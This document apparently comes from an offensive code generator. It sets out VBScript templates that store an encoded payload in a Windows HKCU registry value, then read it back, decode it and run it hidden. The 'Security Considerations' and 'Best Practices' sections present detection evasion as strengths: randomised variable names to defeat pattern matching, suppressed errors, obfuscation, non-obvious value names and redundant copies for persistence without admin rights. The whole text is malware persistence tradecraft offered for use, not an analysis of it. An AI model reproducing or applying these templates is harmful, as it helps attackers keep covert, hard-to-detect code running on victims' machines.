================================================================================
GENERATED CODE STRUCTURE
================================================================================

Storage Code Pattern:
┌─────────────────────────────────────────────────────────────┐
│ Dim shell, regPath, regVal, hive, fullPath                  │
│ Set shell = CreateObject("WScript.Shell")                   │
│ hive = "HKEY_CURRENT_USER"                                  │
│ regPath = "Software\..."                                    │
│ regVal = "ValueName"                                        │
│ fullPath = hive & "\" & regPath & "\" & regVal             │
│                                                              │
│ On Error Resume Next                                        │
│ shell.RegWrite fullPath, "encoded_payload", "REG_SZ"       │
│ On Error GoTo 0                                            │
│                                                              │
│ Set shell = Nothing                                         │
└─────────────────────────────────────────────────────────────┘

Retrieval Code Pattern:
┌─────────────────────────────────────────────────────────────┐
│ Function Decode(encoded)                                    │
│     Dim xmlDoc                                              │
│     Set xmlDoc = CreateObject("MSXML2.DOMDocument")         │
│     xmlDoc.LoadXML "<root><![CDATA[" & encoded & "]]></root>"
│     Decode = xmlDoc.DocumentElement.text                   │
│     Set xmlDoc = Nothing                                    │
│ End Function                                                │
│                                                              │
│ On Error Resume Next                                        │
│ payload = shell.RegRead(fullPath)                          │
│ On Error GoTo 0                                            │
│                                                              │
│ If Len(payload) > 0 Then                                    │
│     decoded = Decode(payload)                              │
│     shell.Run decoded, 0, False                            │
│ End If                                                      │
└─────────────────────────────────────────────────────────────┘

================================================================================
SECURITY CONSIDERATIONS
================================================================================

Strengths:
✓ Variable name randomization prevents pattern matching
✓ Error suppression prevents execution interruption
✓ Multiple encoding options available
✓ No external dependencies required
✓ Native Windows API usage (WScript.Shell)
✓ Graceful error handling

Limitations:
- Encoding is reversible (not encryption)
- Registry operations are not encrypted
- Admin privileges may be required for HKLM
- Payload size limited to registry value size
- Error messages suppressed (debugging difficult)

Best Practices:
→ Use HKCU for user-level persistence (no admin)
→ Combine with full payload obfuscation
→ Use non-obvious registry value names
→ Store in multiple locations for redundancy
→ Regular cleanup of old registry entries
